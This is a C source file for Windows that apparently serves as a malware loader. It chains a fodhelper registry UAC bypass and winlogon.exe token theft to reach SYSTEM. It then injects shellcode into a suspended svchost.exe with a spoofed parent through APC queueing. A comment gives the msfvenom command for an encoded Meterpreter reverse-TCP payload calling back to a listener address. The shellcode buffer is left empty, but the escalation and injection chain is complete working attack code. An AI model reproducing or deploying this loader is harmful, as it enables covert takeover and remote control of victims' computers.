#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#pragma comment(linker,"/subsystem:\"Windows\" /ENTRY:\"mainCRTStartup\"")

#define ACCESS_READ  1
#define ACCESS_WRITE 2

BOOL IsAdmin(void) {

    HANDLE hToken;
    DWORD  dwStatus;
    DWORD  dwAccessMask;
    DWORD  dwAccessDesired;
    DWORD  dwACLSize;
    DWORD  dwStructureSize = sizeof(PRIVILEGE_SET);
    PACL   pACL = NULL;
    PSID   psidAdmin = NULL;
    BOOL   bReturn = FALSE;

    PRIVILEGE_SET   ps;
    GENERIC_MAPPING GenericMapping;

    PSECURITY_DESCRIPTOR     psdAdmin = NULL;
    SID_IDENTIFIER_AUTHORITY SystemSidAuthority = SECURITY_NT_AUTHORITY;

    __try {

        ImpersonateSelf(SecurityImpersonation);

        if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE,
            &hToken)) {

            if (GetLastError() != ERROR_NO_TOKEN)
                __leave;

            if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY,
                &hToken))
                __leave;
        }

        if (!AllocateAndInitializeSid(&SystemSidAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &psidAdmin))
            __leave;

        psdAdmin = LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
        if (psdAdmin == NULL)
            __leave;

        if (!InitializeSecurityDescriptor(psdAdmin,
            SECURITY_DESCRIPTOR_REVISION))
            __leave;

        dwACLSize = sizeof(ACL) + sizeof(ACCESS_ALLOWED_ACE) +
            GetLengthSid(psidAdmin) - sizeof(DWORD);

        pACL = (PACL)LocalAlloc(LPTR, dwACLSize);
        if (pACL == NULL)
            __leave;

        if (!InitializeAcl(pACL, dwACLSize, ACL_REVISION2))
            __leave;

        dwAccessMask = ACCESS_READ | ACCESS_WRITE;

        if (!AddAccessAllowedAce(pACL, ACL_REVISION2,
            dwAccessMask, psidAdmin))
            __leave;

        if (!SetSecurityDescriptorDacl(psdAdmin, TRUE, pACL, FALSE))
            __leave;

        SetSecurityDescriptorGroup(psdAdmin, psidAdmin, FALSE);
        SetSecurityDescriptorOwner(psdAdmin, psidAdmin, FALSE);

        if (!IsValidSecurityDescriptor(psdAdmin))
            __leave;

        dwAccessDesired = ACCESS_READ;

        GenericMapping.GenericRead = ACCESS_READ;
        GenericMapping.GenericWrite = ACCESS_WRITE;
        GenericMapping.GenericExecute = 0;
        GenericMapping.GenericAll = ACCESS_READ | ACCESS_WRITE;

        if (!AccessCheck(psdAdmin, hToken, dwAccessDesired,
            &GenericMapping, &ps, &dwStructureSize, &dwStatus,
            &bReturn)) {
            __leave;
        }

        RevertToSelf();

    }
    __finally {

        if (pACL) LocalFree(pACL);
        if (psdAdmin) LocalFree(psdAdmin);
        if (psidAdmin) FreeSid(psidAdmin);
    }

    return bReturn;
}

DWORD FindProcessPID(const wchar_t* ProcessName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp((const wchar_t*)process.szExeFile, (const wchar_t*)ProcessName))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}



BOOL SePrivTokenrivilege(
    HANDLE hToken,
    LPCTSTR lpszPrivilege,
    BOOL bEnablePrivilege
)
{
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,
        lpszPrivilege,
        &luid))
    {
        return FALSE;
    }

    TOKEN_PRIVILEGES PrivToken;
    PrivToken.PrivilegeCount = 1;
    PrivToken.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        PrivToken.Privileges[0].Attributes = 0;


    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &PrivToken,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        return FALSE;
    }

    return TRUE;
}



BOOL CurrentUserIsLocalSystem()
{
    BOOL bIsLocalSystem = FALSE;
    PSID psidLocalSystem;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    BOOL fSuccess = ::AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
        0, 0, 0, 0, 0, 0, 0, &psidLocalSystem);
    if (fSuccess)
    {
        fSuccess = ::CheckTokenMembership(0, psidLocalSystem, &bIsLocalSystem);
        ::FreeSid(psidLocalSystem);
    }
    return bIsLocalSystem;
}

unsigned char shellcode[] = ("");

int main() {

    //msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 14 LHOST=192.168.0.109 EXITFUNC=thread -f

    if (IsAdmin())
    {
        if (CurrentUserIsLocalSystem())
        {
            int ret;
            STARTUPINFOEXA siex = { 0 };
            PROCESS_INFORMATION piex = { 0 };
            SIZE_T sizeT;
            HANDLE hSystemToken = NULL;
            OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hSystemToken);

            siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);
            HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindProcessPID(L"explorer.exe"));
            InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
            siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
            InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
            UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
            SetCurrentDirectoryA("C:\\Windows\\System32\\");
            //CreateProcessAsUserA(hSystemToken, "C:\\Windows\\System32\\cmd.exe",
            CreateProcessAsUserA(hSystemToken, "C:\\Windows\\System32\\svchost.exe",
                NULL, NULL, NULL, TRUE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                //EXTENDED_STARTUPINFO_PRESENT,
                NULL,
                NULL,
                (LPSTARTUPINFOA)&siex,
                &piex);
            LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            ret = GetLastError();
            WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
            QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
            ResumeThread(piex.hThread);
            CloseHandle(piex.hThread);


            return 0;
        }
        else
        {
            HANDLE hToken = NULL;


            HANDLE hDpToken = NULL;



            HANDLE hCurrentToken = NULL;
            BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
            SePrivTokenrivilege(hCurrentToken, L"SeDebugPrivilege", TRUE);

            DWORD PID_TO_IMPERSONATE = FindProcessPID(L"winlogon.exe");
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);



            BOOL TokenRet = OpenProcessToken(hProcess,
                TOKEN_DUPLICATE |
                TOKEN_ASSIGN_PRIMARY |
                TOKEN_QUERY, &hToken);

            BOOL impersonateUser = ImpersonateLoggedOnUser(hToken);
            if (GetLastError() == NULL)
            {
                RevertToSelf();
            }


            BOOL dpToken = DuplicateTokenEx(hToken,
                TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID |
                TOKEN_QUERY |
                TOKEN_DUPLICATE |
                TOKEN_ASSIGN_PRIMARY,
                NULL,
                SecurityImpersonation,
                TokenPrimary,
                &hDpToken
            );

            STARTUPINFOW si = { 0 };
            PROCESS_INFORMATION pi = { 0 };
            si.cb = sizeof(STARTUPINFOEXW);
            wchar_t szPath[MAX_PATH + 1] = { 0 };
            GetModuleFileNameW(NULL, szPath, MAX_PATH);
            BOOL Ret =
                CreateProcessWithTokenW(hDpToken,
                    LOGON_WITH_PROFILE,
                    szPath,
                    NULL,
                    CREATE_NO_WINDOW,
                    NULL,
                    NULL,
                    &si,
                    &pi);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return 0;
        }


    }
    else {
        PROCESS_INFORMATION pi = { 0 };
        STARTUPINFOA si = { 0 };
        HKEY hKey;


        char szPath[MAX_PATH + 1] = { 0 };
        GetModuleFileNameA(NULL, szPath, MAX_PATH);

        si.cb = sizeof(STARTUPINFO);
        si.wShowWindow = SW_HIDE;



        RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", &hKey);
        RegSetValueExA(hKey, "", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (LPBYTE)"", sizeof(""));
        CreateProcessA("C:\\Windows\\System32\\cmd.exe", (LPSTR)"/c C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        Sleep(1000);
        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

        return 0;
    }


}